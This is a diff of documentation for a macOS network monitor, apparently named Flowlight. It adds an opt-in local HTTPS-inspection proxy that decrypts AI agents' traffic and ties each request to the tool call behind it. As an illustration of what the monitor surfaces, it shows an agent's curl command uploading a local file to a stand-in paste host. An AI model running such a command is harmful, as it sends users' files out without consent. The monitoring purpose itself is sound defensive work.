@@ -64,7 +64,7 @@ Documentation
 
  On this page
  InstallFirst launchHostnames
- The four viewsAI agent rulesTools & MCPAllowlistsOther alerts
+ The viewsAI agent rulesTools & MCPAllowlistsHTTPS inspectionOther alerts
  Capture enginesYour dataUpdates
  Demo modeUninstallLimitations
 
@@ -103,7 +103,7 @@ open build/Build/Products/Release/Flowlight.app
  (Cloudflare, Inc. · AS13335). It's on by default and sends those public IP addresses (never private ones) to Team Cymru's
  DNS service. Turn it off in Capture.
 
- The four views
+ The views
 
  ViewShortcutWhat it answers
 
@@ -114,6 +114,8 @@ open build/Build/Products/Release/Flowlight.app
  Reports⌘3Where traffic went, from second to year. Group by App, Destination or IP; switch to Charts; export CSV.
 
  Alerts⌘4Everything that looked unusual, with the app, the destination and the number that tripped the rule.
+
+ Inspect⌘5Optional: decrypted requests from the agents you route through Flowlight, and the tool calls behind them.
 
  In Reports, hover a bar to see which apps drove it, click it to zoom in, and double-click any row to narrow the report to it.
 
@@ -157,6 +159,31 @@ open build/Build/Products/Release/Flowlight.app
  From then on, anything the agent or its tools contact that isn't listed raises a critical Allowlist violation alert (once
  per domain every 6 hours) and is marked Not allowed, with an Allow button that adds it. Flowlight doesn't block
  connections; blocking needs the Network Extension engine and is on the roadmap.
+
+ HTTPS inspection (optional)
+
+ Off by default. When you turn it on in Inspect, Flowlight runs a local proxy on 127.0.0.1:8877 with its own
+ certificate authority, created on your Mac. For apps you route through it, it decrypts HTTPS and shows each request and response:
+ headers, bodies, status and timing. From an AI agent's model responses it reads every tool call the model asked for
+ (Anthropic, OpenAI Chat and Responses, Gemini, and MCP tools/call requests), and it links each request a tool makes back to
+ the call that caused it: curl's request to paste.example shows ← Bash: curl -s https://paste.example/up.
+ AI Agents lists the tools each agent ran, with counts and the latest command.
+
+ Turn it on in Inspect › Setup. By default only AI agents and the tools they start are decrypted; other apps sent through
+ the proxy pass through encrypted and aren't recorded.
+
+ Route an agent. Click Open Inspected Terminal and start Claude Code, Codex, Gemini CLI or Aider there, or
+ paste Copy Shell Setup into any shell. It sets the proxy variables and points Node, Python, curl and Git at the Flowlight
+ certificate, for that shell only.
+
+ Optional: trust the certificate (macOS asks for your password) and turn on the system proxy, so desktop apps that
+ follow proxy settings (Cursor, VS Code, Claude) are inspected too. The proxy file falls back to a direct connection whenever Flowlight
+ isn't running.
+
+ Apple services and password managers are never decrypted (edit the list in Setup). Apps that pin their certificates refuse the
+ Flowlight certificate; Flowlight notices and passes them through encrypted. API keys, cookies and other credential headers are never
+ stored, recorded requests are kept 3 days, and Remove Certificate & Recorded Data deletes the certificate, its trust
+ setting and everything recorded. Inspection is HTTP/1.1 only (Flowlight asks both sides for it) and not available in demo mode.
 
  Other alerts
 
@@ -212,7 +239,10 @@ open build/Build/Products/Release/Flowlight.app
 
  Attribution is per process, not per thread.
 
- Flowlight reads metadata only and never decrypts traffic. QUIC server names come from DNS rather than the encrypted handshake.
+ Unless you turn on HTTPS inspection, Flowlight reads metadata only and never decrypts traffic. QUIC server names come from DNS rather
+ than the encrypted handshake.
+
+ Inspection only sees apps that use the proxy, and never apps that pin their certificates.
 
  Hostname capture follows the primary network interface.
 
@@ -353,6 +383,13 @@ What looked wrong? Explainable, per-app alerts with the destination and the thre
 
  api.github.com · via github MCP  ·  paste.example · via curl
 
+ ⌕ Opt-in
+ Tool calls, from the model's own responses
+
+ Turn on HTTPS inspection and Flowlight reads every tool call the model asks an agent to run, then ties each tool's request back to the call that caused it.
+
+ curl → paste.example:443  ←  Bash: curl -s https://paste.example/up -d @notes.txt
+
  ⚠ Critical
  Sensitive channel
 
@@ -443,7 +480,7 @@ egress channel
  APNsFCMDockerKubernetesOllama
 
  Flowlight observes every TCP and UDP flow, which covers essentially all app traffic. ICMP (ping) and
- other raw-IP protocols aren't attributed, and encrypted payloads are never decrypted.
+ other raw-IP protocols aren't attributed, and encrypted payloads are never decrypted unless you turn on HTTPS inspection.
 
  How it compares
 
@@ -486,7 +523,7 @@ e.g. Wireshark
 
  Stays on your MacOne local SQLite file. No account, no cloud sync, no telemetry.
 
- Metadata onlyHostnames, ports and byte counts. Packet contents are never stored.
+ Metadata by defaultHostnames, ports and byte counts. Decrypting HTTPS is a separate mode you have to turn on, and it stays on your Mac.
 
  Filtered in the kernelCapture passes only DNS answers and TLS ClientHellos. Everything else is dropped before Flowlight sees it.
 
@@ -529,10 +566,11 @@ Questions
 
  Can it read my HTTPS traffic?
 
- No, and it doesn't try. It reads the hostname a client asks for when it opens a connection (TLS SNI) and the
- DNS answers that map names to addresses. Contents stay encrypted. Full request inspection would need a local
- TLS-intercepting proxy with its own trusted certificate, which is a different trust model, so it's on the roadmap only
- as a separate mode you'd have to turn on. Some apps pin their certificates and would still refuse it.
+ Not by default. It reads the hostname a client asks for when it opens a connection (TLS SNI) and the DNS answers
+ that map names to addresses, and contents stay encrypted. If you want the full picture, HTTPS inspection is a
+ separate, opt-in mode: Flowlight becomes a local proxy with its own certificate authority and decrypts the apps you route
+ through it (AI agents only, by default), including every tool call a model asks an agent to run. Apps that pin their
+ certificates still refuse it, and Apple services and password managers are never decrypted.
 
  How is this different from Little Snitch or LuLu?
 
@@ -591,7 +629,7 @@ Privacy
  so you can check the claims against the source.
 
  On this page
- In shortWhat it recordsPacket captureRead locally
+ In shortWhat it recordsPacket captureRead locallyHTTPS inspection
  Network requestsPermissionsRetention
  This websiteContact
 
@@ -599,7 +637,7 @@ Privacy
 
  Flowlight records network metadata (which app, which host, which port, how many bytes, when) in a database on your Mac.
 
- It never records packet contents and never decrypts traffic.
+ It never records packet contents and never decrypts traffic, unless you turn on the optional HTTPS inspection for apps you route through it.
 
  Nothing you record is ever sent anywhere. There is no telemetry, crash reporting or analytics.
 
@@ -623,6 +661,15 @@ Privacy
  configuration files of the agents it supports (for example ~/.claude.json, ~/.cursor/mcp.json and
  ~/.codex/config.toml). It keeps only each server's name, launch command and URL, in memory, and stores only the resulting
  labels ("via curl", "github MCP") with your traffic. Nothing from these files or command lines is sent anywhere.
+
+ HTTPS inspection
+
+ Off by default. If you turn it on, Flowlight creates a certificate authority on your Mac (its key never leaves
+ ~/Library/Application Support/Flowlight/Inspection) and runs a proxy that accepts connections only from this Mac. For apps you
+ route through it, it records requests and responses, including bodies up to 2 MB, in the local database for 3 days. Credential headers
+ (Authorization, cookies, API keys) are replaced with their length before anything is stored. Apple services and password managers are
+ never decrypted. Nothing recorded is sent anywhere. Turning inspection off stops the proxy; Remove Certificate & Recorded
+ Data deletes the certificate, its trust setting and every recorded request.
 
  Network requests the app makes
 
